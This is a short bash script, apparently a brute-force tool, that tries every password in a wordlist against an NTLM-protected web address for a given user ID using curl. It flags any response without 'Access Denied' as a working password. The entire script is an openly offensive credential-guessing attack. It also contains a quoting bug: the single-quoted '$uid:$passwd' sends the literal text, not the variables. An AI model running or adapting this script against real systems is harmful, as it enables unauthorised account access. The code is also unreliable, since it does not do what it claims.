#!/bin/bash
count=0;
function usage {
	echo -e "\nUsage: ./bf.script <URI> <WORDLIST> <UID>\n"
	exit 1;
}
uri=$1
words=$2
uid=$3
if [ "$#" -ne 3 ];
	then usage;
fi;
for passwd in $(cat $words); do
	let count=$count+1;
	resp=$(curl -s $uri --ntlm -u '$uid:$passwd' -i 2>/dev/null | head -n 1); 
	if ! [[ "$resp" =~ "Access Denied" ]]; 
		then echo "$passwd worked: $resp"; 
	fi; 
	if (( $count % 500 == 0 ));
		then echo "Tested $count passwords."
	fi;
done
